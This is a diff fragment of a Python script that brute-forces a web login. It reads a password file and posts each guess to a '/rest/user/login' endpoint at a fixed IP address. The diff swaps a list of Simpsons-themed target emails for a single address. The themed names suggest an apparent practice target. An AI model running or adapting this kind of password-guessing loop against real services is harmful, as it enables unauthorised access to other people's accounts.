@@ -7,8 +7,8 @@ with open("./passwords") as f:
     passwords = f.readlines()
 passwords = [x.strip() for x in passwords]
 
-emails = ["Apu@kwike.mart", "admin@kwike.mart", "Apu@kwik-e.mart", "admin@kwik-e.mart", "apu@kwik-e.mart",
-          "apu@kwike.mart"]
+#emails = ["Apu@kwike.mart", "admin@kwike.mart", "Apu@kwik-e.mart", "admin@kwik-e.mart", "apu@kwik-e.mart",          "apu@kwike.mart"]
+emails = ["Maggie.Simpson@simpsonmail.com"]
 failed = 0
 
 for password in passwords:
@@ -20,7 +20,6 @@ for password in passwords:
         r = requests.post('http://43.241.202.33:3003/rest/user/login',
                           data=data_json,
                           headers=headers,
-                          #cookies=dict(io='mWDXEuGZqkeI1tUbAABN')
                           )
 
         if r.status_code != 401:
